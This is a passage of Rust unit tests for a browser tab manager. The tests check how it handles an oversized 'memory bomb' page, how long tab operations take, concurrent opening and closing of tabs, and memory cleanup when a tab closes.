        // Try to create very large content in existing tabs
        let large_content = PageContent::Loaded {
            url: "https://memory-bomb.com".to_string(),
            title: "Memory Bomb".to_string(),
            content: "x".repeat(100_000_000), // 100MB - should be rejected or limited
            element_count: 1_000_000,
            size_bytes: 100_000_000,
        };
        
        if let Some(&first_tab) = tab_ids.first() {
            let large_content_result = manager.update_page_content(first_tab, large_content).await;
            
            // Either rejected or handled gracefully
            match large_content_result {
                Ok(_) => {
                    // If accepted, verify it doesn't break the system
                    let tab_states = manager.get_tab_states();
                    assert!(!tab_states.is_empty());
                }
                Err(TabError::InvalidOperation(_)) => {
                    // Resource limit exceeded - acceptable
                }
                Err(e) => {
                    panic!("Unexpected error: {:?}", e);
                }
            }
        }
        
        // Clean up - close all tabs
        for tab_id in tab_ids {
            let _ = manager.close_tab(tab_id).await;
        }
        
        // Verify cleanup worked
        let final_states = manager.get_tab_states();
        assert!(final_states.is_empty() || final_states.len() < 10);
    }
}

#[cfg(test)]
mod performance_security_tests {
    use super::*;
    use test_utils::*;

    #[tokio::test]
    async fn test_tab_operation_timing() {
        let manager = SendSafeTabManager::new();
        
        // Measure tab creation time
        let start = std::time::Instant::now();
        let tab_id = manager.open_tab("https://timing-test.com".to_string(), TabType::Ephemeral).await.unwrap();
        let creation_time = start.elapsed();
        
        // Should complete within reasonable time
        assert!(creation_time.as_millis() < 1000, "Tab creation too slow: {:?}", creation_time);
        
        // Measure content update time
        let content = create_sensitive_page_content();
        let start = std::time::Instant::now();
        manager.update_page_content(tab_id, content).await.unwrap();
        let update_time = start.elapsed();
        
        assert!(update_time.as_millis() < 100, "Content update too slow: {:?}", update_time);
        
        // Measure tab closing time
        let start = std::time::Instant::now();
        manager.close_tab(tab_id).await.unwrap();
        let close_time = start.elapsed();
        
        assert!(close_time.as_millis() < 500, "Tab closing too slow: {:?}", close_time);
    }

    #[tokio::test]
    async fn test_concurrent_tab_operations() {
        let manager = Arc::new(SendSafeTabManager::new());
        
        // Create multiple tabs concurrently
        let mut handles = Vec::new();
        
        for i in 0..10 {
            let manager_clone = manager.clone();
            let handle = tokio::spawn(async move {
                let url = format!("https://concurrent{}.com", i);
                manager_clone.open_tab(url, TabType::Ephemeral).await
            });
            handles.push(handle);
        }
        
        // Wait for all tabs to be created
        let mut tab_ids = Vec::new();
        for handle in handles {
            let result = handle.await.unwrap();
            assert!(result.is_ok());
            tab_ids.push(result.unwrap());
        }
        
        assert_eq!(tab_ids.len(), 10);
        
        // Verify all tabs exist and are isolated
        let tab_states = manager.get_tab_states();
        assert_eq!(tab_states.len(), 10);
        
        // Verify each tab has unique ID and URL
        let mut urls = std::collections::HashSet::new();
        let mut ids = std::collections::HashSet::new();
        
        for state in &tab_states {
            assert!(urls.insert(state.url.clone()), "Duplicate URL found");
            assert!(ids.insert(state.id), "Duplicate ID found");
        }
        
        // Clean up concurrently
        let mut close_handles = Vec::new();
        
        for tab_id in tab_ids {
            let manager_clone = manager.clone();
            let handle = tokio::spawn(async move {
                manager_clone.close_tab(tab_id).await
            });
            close_handles.push(handle);
        }
        
        for handle in close_handles {
            let result = handle.await.unwrap();
            assert!(result.is_ok());
        }
        
        // Verify all tabs are closed
        let final_states = manager.get_tab_states();
        assert!(final_states.is_empty());
    }

    #[tokio::test]
    async fn test_memory_cleanup_on_tab_close() {
        let manager = SendSafeTabManager::new();
        
        // Create tab with large content
        let tab_id = manager.open_tab("https://memory-test.com".to_string(), TabType::Ephemeral).await.unwrap();
        
        let large_content = PageContent::Loaded {
            url: "https://memory-test.com".to_string(),
            title: "Large Content".to_string(),
            content: "x".repeat(1_000_000), // 1MB
            element_count: 10_000,
            size_bytes: 1_000_000,
        };
        
        manager.update_page_content(tab_id, large_content).await.unwrap();
        
        // Verify content exists
        let states_before = manager.get_tab_states();
        assert_eq!(states_before.len(), 1);
        
        if let PageContent::Loaded { size_bytes, .. } = &states_before[0].content {
            assert_eq!(*size_bytes, 1_000_000);
        }
        
        // Close tab and verify memory is released
        let close_start = std::time::Instant::now();
        manager.close_tab(tab_id).await.unwrap();
        let close_time = close_start.elapsed();
        
        // Should close quickly even with large content
        assert!(close_time.as_millis() < 500, "Large tab cleanup too slow: {:?}", close_time);
        
        // Verify no memory leaks
        let states_after = manager.get_tab_states();
        assert!(states_after.is_empty());
        
        // Create new tab to verify memory is available
        let new_tab = manager.open_tab("https://new-test.com".to_string(), TabType::Ephemeral).await;
        assert!(new_tab.is_ok(), "Should be able to create new tab after cleanup");
    }
}